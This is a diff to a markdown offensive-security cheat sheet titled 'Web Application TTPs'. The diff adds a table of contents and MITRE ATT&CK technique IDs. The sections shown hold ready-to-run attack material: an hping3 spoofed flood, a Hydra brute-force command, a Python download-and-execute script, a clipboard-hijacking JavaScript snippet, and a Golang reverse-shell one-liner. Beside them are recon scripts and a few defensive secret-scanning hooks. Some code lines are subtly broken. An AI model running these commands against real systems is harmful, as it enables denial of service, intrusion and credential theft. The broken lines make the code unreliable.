@@ -1,18 +1,41 @@
 # Web Application TTPs
 
-## HPING3 DoS
+## Table of Contents
+
+- [HPING3 DoS](#hping3-dos) - T1498
+- [Hydra Online Brute Force](#hydra-online-brute-force) - T1110
+- [Download HTTP File and Execute](#download-http-file-and-execute) - T1105
+- [Hashcat](#hashcat) - T1110.002
+- [Malicious Javascript](#malicious-javascript) - T1059.007
+- [Execute Fileless Scripts in Golang](#execute-fileless-scripts-in-golang) - T1059
+- [Golang Reverse Shell](#golang-reverse-shell) - T1059
+- [Web Applications](#web-applications)
+  - [Command Injection](#command-injection) - T1059
+- [WayBack Machine Enumerator](#wayback-machine-enumerator) - T1596
+- [Golang Webserver Banner Scanner](#golang-webserver-banner-scanner) - T1046
+- [Minimal Golang WebDAV Server](#minimal-golang-webdav-server) - T1071.001
+- [Apple Filing Protocol (AFP)](#apple-filing-protocol-afp) - T1021
+- [Pre-Commit Hooks to Prevent Credential Leaks](#pre-commit-hooks-to-prevent-credential-leaks) - T1552
+- [Scanning Git History for Secrets](#scanning-git-history-for-secrets) - T1552.001
+- [Truffleroasting GitHub Organizations](#truffleroasting-github-organizations) - T1552.001
+- [Turning Nmap into a Vulnerability Scanner Using GitHub Actions](#turning-nmap-into-a-vulnerability-scanner-using-github-actions) - T1595.002
+- [XSS Testing](#xss-testing) - T1189
+
+---
+
+## HPING3 DoS (T1498)
 
 ```bash
 hping3 targetiP --flood --frag --spoof ip --destport # --syn
 ```
 
-## Hydra Online Brute Force
+## Hydra Online Brute Force (T1110)
 
 ```bash
 hydra -1 ftp -P words -v targetiP ftp
 ```
 
-## Download HTTP File and Execute
+## Download HTTP File and Execute (T1105)
 
 ```python
 #!/usr/bin/python import urllib2, os
@@ -27,7 +50,7 @@ except: continue
 if os.path.exists("/tmp/cb.sh"): os.system("chmod -oo /tmp/cb.sh") os. system ("/tmp/cb. sh")
 ```
 
-## Hashcat
+## Hashcat (T1110.002)
 
 ```sh
 DICTIONARY ATTACK
@@ -50,7 +73,7 @@ dict.txt ?a?a?a?a
 ?a?a?a?a dict.txt
 ```
 
-## Malicious Javascript
+## Malicious Javascript (T1059.007)
 
 ```javascript
 <script>
@@ -58,7 +81,7 @@ document.getElementById('copy').addEventListener('copy', function(e) { e.clipboa
  </script>
  ```
 
-# Execute Fileless Scripts in Golang
+# Execute Fileless Scripts in Golang (T1059)
 
 ```golang
 package main
@@ -86,7 +109,7 @@ func main() {
 }
 ```
 
-## Golang Reverse Shell
+## Golang Reverse Shell (T1059)
 
 ```golang
 echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","127.0.0.1:1337");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;http://cmd.Run();}'>/tmp/sh.go&&go run /tmp/sh.go
@@ -94,7 +117,7 @@ echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","
 
 # Web Applications
 
-## Command Injection
+## Command Injection (T1059)
 
 Special Characters
 
@@ -229,7 +252,7 @@ X-Rewrite-Url: 127.0.0.1
 X-True-IP: 127.0.0.1
 ```
 
-## WayBack Machine Enumerator
+## WayBack Machine Enumerator (T1596)
 
 Python script for enumerating Wayback Machine internet archives for potential subdomains, sites, and files; specifically potential password and robots.txt files.
 
@@ -267,7 +290,7 @@ Or use this one-liner to screenshot web pages with EyeWitness!
 root@RoseSecurity:~# python3 -c 'import requests; import os; url = str("https://web.archive.org/cdx/search/cdx?url=<website>/*&output=text&fl=original&collapse=urlkey"); url_request = requests.get(url); web_file = open("/tmp/website_enum.txt", "a"); web_file.write(url_request.text); web_file.close()'; eyewitness -f /tmp/website_enum.txt
 ```
 
-## Golang Webserver Banner Scanner
+## Golang Webserver Banner Scanner (T1046)
 
 This program reads in a file of IP addresses, outputting the server fingerprint to the terminal.
 
@@ -320,7 +343,7 @@ func main() {
 }
 ```
 
-## Minimal Golang WebDAV Server
+## Minimal Golang WebDAV Server (T1071.001)
 
 ```go
 package main
@@ -345,7 +368,7 @@ func main() {
 }
 ```
 
-## Apple Filing Protocol (AFP)
+## Apple Filing Protocol (AFP) (T1021)
 
 The Apple Filing Protocol (AFP), once known as AppleTalk Filing Protocol, is a specialized network protocol included within the Apple File Service (AFS). It is designed to provide file services for macOS and the classic Mac OS.
 
@@ -354,7 +377,7 @@ msf> use auxiliary/scanner/afp/afp_server_info
 nmap -sV --script "afp-* and not dos and not brute" -p <PORT> <IP>
 ```
 
-## Pre-Commit Hooks to Prevent Credential Leaks
+## Pre-Commit Hooks to Prevent Credential Leaks (T1552)
 
 ```yaml
 -   repo: https://github.com/pre-commit/pre-commit-hooks
@@ -364,7 +387,7 @@ nmap -sV --script "afp-* and not dos and not brute" -p <PORT> <IP>
     -   id: detect-private-key
 ```
 
-## Scanning Git History for Secrets
+## Scanning Git History for Secrets (T1552.001)
 
 ```sh
 # Install git-secrets and build
@@ -383,7 +406,7 @@ git secrets --scan-history
 git secrets --scan /path/to/file
 ```
 
-## Truffleroasting GitHub Organizations
+## Truffleroasting GitHub Organizations (T1552.001)
 
 ```bash
 #!/usr/bin/env bash
@@ -408,7 +431,7 @@ while read -r line; do
 done < orgs.txt
 ```
 
-## Turning Nmap into a Vulnerability Scanner Using GitHub Actions
+## Turning Nmap into a Vulnerability Scanner Using GitHub Actions (T1595.002)
 
 ```yaml
 name: Nmap GitHub Action
@@ -433,7 +456,7 @@ jobs:
           nmap -sV --script=vulscan/vulscan.nse rosesecurityresearch.com
 ```
 
-## XSS Testing
+## XSS Testing (T1189)
 
 Use these strings on all input fields and identify what remains after filtering for XSS attacks (Source: Cross Site Scripting Vulnerability Payload List):
 
